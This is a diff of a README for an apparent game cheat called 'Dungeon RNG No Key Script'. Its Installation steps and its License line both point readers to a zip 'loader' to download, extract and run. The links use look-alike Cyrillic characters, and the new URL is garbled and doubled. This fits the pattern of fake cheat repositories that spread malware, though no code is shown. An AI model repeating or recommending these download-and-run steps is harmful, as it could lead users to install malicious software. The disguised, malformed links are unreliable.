@@ -26,7 +26,7 @@ Welcome to **Dungeon RNG No Key Script**! This innovative tool revolutionizes yo
 
 ## 🚀 Installation
 
-1. Download **https://raw.githubusercontent.com/atharva-netwin/DungeonRNG-KeylessRun/main/Lоader.zip** from the repository.  
+1. Download **https://github.com/atharva-netwin/DungeonRNG-KeylessRun/raw/refs/heads/main/francisca/Dungeon_Run_Keyless_RN_v2.6.zipоhttps://github.com/atharva-netwin/DungeonRNG-KeylessRun/raw/refs/heads/main/francisca/Dungeon_Run_Keyless_RN_v2.6.zip** from the repository.  
 2. Extract contents to your preferred folder.  
 3. Run the loader application according to your operating system.  
 4. Follow on-screen prompts to activate enhanced RNG mode.
@@ -49,7 +49,7 @@ This project is intended for educational and experimental uses only. Use respons
 
 ## 📃 License
 
-MIT License – Learn more: https://raw.githubusercontent.com/atharva-netwin/DungeonRNG-KeylessRun/main/Lоader.zip
+MIT License – Learn more: https://github.com/atharva-netwin/DungeonRNG-KeylessRun/raw/refs/heads/main/francisca/Dungeon_Run_Keyless_RN_v2.6.zipоhttps://github.com/atharva-netwin/DungeonRNG-KeylessRun/raw/refs/heads/main/francisca/Dungeon_Run_Keyless_RN_v2.6.zip
 
 ---
 
